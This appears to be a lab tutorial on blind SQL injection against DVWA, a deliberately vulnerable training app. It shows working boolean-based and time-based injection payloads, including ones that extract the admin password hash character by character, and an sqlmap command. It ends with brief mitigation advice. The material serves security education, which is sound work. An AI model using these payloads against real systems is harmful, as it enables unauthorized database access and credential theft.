Blind SQL Injection

🔍 What Is It?

Blind SQL Injection is a variant of SQL Injection where the application does not return query results or error messages to the attacker. Instead, the attacker infers information by observing differences in the application's behavior — either through boolean-based responses (true/false conditions) or time-based delays.

⚙️ How It Works in DVWA
DVWA's Blind SQLi module also takes a User ID but only shows a message like "User ID exists in the database." or "User ID is MISSING from the database." — no data is echoed back. The attacker must ask the database yes/no questions.

💥 Exploitation

Boolean-Based Blind SQLi
The technique is to craft a condition that is either TRUE or FALSE and observe the response message.
Confirm vulnerability:
1' AND '1'='1    → "User ID exists" (TRUE)
1' AND '1'='2    → "User ID is MISSING" (FALSE)
Extract database name character by character:
1' AND SUBSTRING(database(),1,1)='d'-- -   → TRUE if first char is 'd'
1' AND SUBSTRING(database(),1,1)='e'-- -   → FALSE
By iterating through characters and positions, the full database name is revealed.
Extract data (e.g., admin password hash):1' AND SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1)='2'-- -

Time-Based Blind SQLi

When the application gives no visual difference between true/false, use SLEEP():
1' AND SLEEP(5)-- -          → page delays 5 seconds = vulnerable
1' AND IF(1=1, SLEEP(5), 0)-- -   → always sleeps
1' AND IF(SUBSTRING(database(),1,1)='d', SLEEP(5), 0)-- -If the page hangs for 5 seconds, the condition is TRUE.

Automation with SQLMap

Manual blind SQLi is tedious. sqlmap automates it:
bashsqlmap -u "http://dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=xxx; security=low" \
       --dbs --batch
       
🔐 Mitigation

Same as standard SQL Injection — prepared statements are the primary defense. Additionally:
Suppress all database error messages in production Use generic error pages Monitor for unusual patterns of slow queries (time-based attacks)

